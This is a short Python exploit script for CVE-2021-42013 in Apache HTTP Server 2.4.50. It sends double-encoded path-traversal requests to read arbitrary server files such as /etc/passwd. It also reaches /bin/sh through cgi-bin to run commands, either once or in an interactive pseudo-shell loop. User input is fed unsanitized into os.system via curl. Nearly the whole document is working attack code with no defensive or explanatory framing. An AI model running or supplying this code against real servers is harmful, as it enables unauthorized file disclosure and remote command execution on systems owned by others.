import argparse
from urllib.request import urlopen
import os

class Apache:
    def __init__(self,target,lfi,rce):
        self.target = target
        self.lfi = lfi
        self.rce = rce
        self.url = self.url_fix()
        if args.lfi:
            self.file_read()
        if args.rce or args.shell:
            self.execute()

    def url_fix(self):
        check = self.target[-1]
        if check == "/": 
            return self.target
        else:
            fixed_url = self.target + "/"
            return fixed_url

    def file_read(self):
        url = self.url + 'icons/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65'
        file = url + self.lfi
        req_file = urlopen(file)
        print("\n" + req_file.read().decode("utf-8"))

    def execute(self):
        if args.shell:
            while True:
                cmd = input("RCE: ")
                url = self.url + "cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
                payload = "curl --path-as-is " + url + " -d 'echo; " + cmd +"'"
                os.system(payload)
        else:
            url = self.url + "cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh"
            payload = "curl --path-as-is " + url + " -d 'echo; " + self.rce +"'"
            os.system(payload)

if __name__ == "__main__":
    print('Apache HTTP Server 2.4.50 - Local File Inclusion (LFI) & Remote Code Execution (RCE)')
    parser = argparse.ArgumentParser(description='CVE-2021-42013 - Apache HTTP Server 2.4.50 LFI & RCE')
    parser.add_argument('-t', metavar='<Target URL>', help='Example: -t http://apache.hack/', required=True)
    parser.add_argument('-lfi', metavar='<Local File Inclusion>', help='-lfi /etc/passwd', required=False)
    parser.add_argument('-rce', metavar='<Remote Code Execution>', help='-rce whoami', required=False)
    parser.add_argument('-shell',action='store_true',help='Pseudo-Shell option for continous rce', required=False) 
    
    args = parser.parse_args()
    try:
        Apache(args.t,args.lfi,args.rce)
    except KeyboardInterrupt:
        print("\nBye Bye!")
        exit()